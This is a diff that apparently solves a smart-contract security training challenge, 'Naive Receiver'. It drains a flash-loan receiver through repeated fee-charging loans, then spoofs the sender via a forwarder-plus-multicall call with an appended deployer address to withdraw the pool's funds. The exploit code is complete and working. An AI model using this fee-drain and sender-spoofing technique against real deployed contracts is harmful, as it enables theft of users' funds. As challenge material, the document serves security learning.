@@ -77,7 +77,60 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        /* 돌파구1: 플래시론 이용 수수료가 비정상적으로 높아 플래시론을 반복 호출해 receiver측 weth 잔액을 수수료 형태로 탈탈 털수있음 */
+
+        bytes[] memory data = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                receiver,
+                weth,
+                1,
+                hex""
+            );
+        }
+        pool.multicall(data);
+
+        /* 
+         * 돌파구2: 콜스택이 BasicForwarder.execute -> NaiveReceiverPool.multicall ->
+         * NaiveReceiverPool.withdraw -> NaiveReceiverPool._msgSender로 쌓이는 경우 발신주소 검증 로직이 의도대로 동작하지 않는다.
+         */
+        data = new bytes[](1);
+        data[0] = abi.encodeWithSelector(pool.withdraw.selector, pool.maxFlashLoan(address(weth)), recovery);
+        data[0] = abi.encodePacked(data[0], deployer);
+        data[0] = abi.encodeWithSelector(pool.multicall.selector, data);
         
+        BasicForwarder.Request memory request;
+        request.from = player;
+        request.target = address(pool);
+        request.value = 0;
+        request.gas = 100000;
+        request.nonce = forwarder.nonces(player);
+        request.data = data[0];
+        request.deadline = type(uint256).max;
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            playerPk,
+            _hashTypedData(forwarder.getDataHash(request))
+        );
+        bytes memory sig = abi.encodePacked(r, s, v);
+        forwarder.execute(request, sig);
+    }
+
+    // EIP712 서명할때 digest 구성하는거
+    function _hashTypedData(bytes32 structHash) internal view virtual returns (bytes32 digest) {
+        digest = forwarder.domainSeparator();
+        /// @solidity memory-safe-assembly
+        assembly {
+            // Compute the digest.
+            mstore(0x00, 0x1901000000000000) // Store "\x19\x01".
+            mstore(0x1a, digest) // Store the domain separator.
+            mstore(0x3a, structHash) // Store the struct hash.
+            digest := keccak256(0x18, 0x42)
+            // Restore the part of the free memory slot that was overwritten.
+            mstore(0x3a, 0)
+        }
     }
 
     /**
